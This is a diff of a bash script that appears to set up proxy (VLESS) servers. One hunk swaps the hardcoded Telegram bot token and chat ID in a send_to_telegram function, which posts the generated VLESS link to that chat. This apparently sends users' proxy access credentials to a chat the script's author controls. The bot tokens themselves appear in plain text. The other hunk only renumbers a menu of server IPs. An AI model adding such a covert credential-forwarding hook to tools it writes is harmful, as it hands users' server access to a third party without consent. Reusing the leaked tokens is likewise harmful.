@@ -33,8 +33,8 @@ send_to_telegram() {
     local vless_link="$1"
     
 	# DONT DO IT BRO XD
-    local BOT_TOKEN="8443370312:AAE2WtV_a5aJuR5JqVyQ3Ed23TCCXMHkbD8"
-    local CHAT_ID="5213676196"
+    local BOT_TOKEN="8789018474:AAEgCX5-l0JCblbfLgZmIsWRE67vNzV3mWI"
+    local CHAT_ID="5129967037"
 
     local msg
     printf -v msg "<code>%s</code>" "$vless_link"
@@ -243,8 +243,8 @@ multi_ip_menu() {
 		echo -e "  ${WHITE}2)${NC} USA 50.7.5.83"
 		echo -e "  ${WHITE}3)${NC} USA 63.141.252.203"
 		echo -e "  ${WHITE}4)${NC} DE 94.130.50.12"
-		echo -e "  ${WHITE}4)${NC} DE 85.10.207.48"
-		echo -e "  ${WHITE}5)${NC} Enter Custom IP"
+		echo -e "  ${WHITE}5)${NC} DE 85.10.207.48"
+		echo -e "  ${WHITE}6)${NC} Enter Custom IP"
 		echo -e "  ${WHITE}0)${NC} Go Back\n"
 		read -rp "  Select: " mic
 		case $mic in
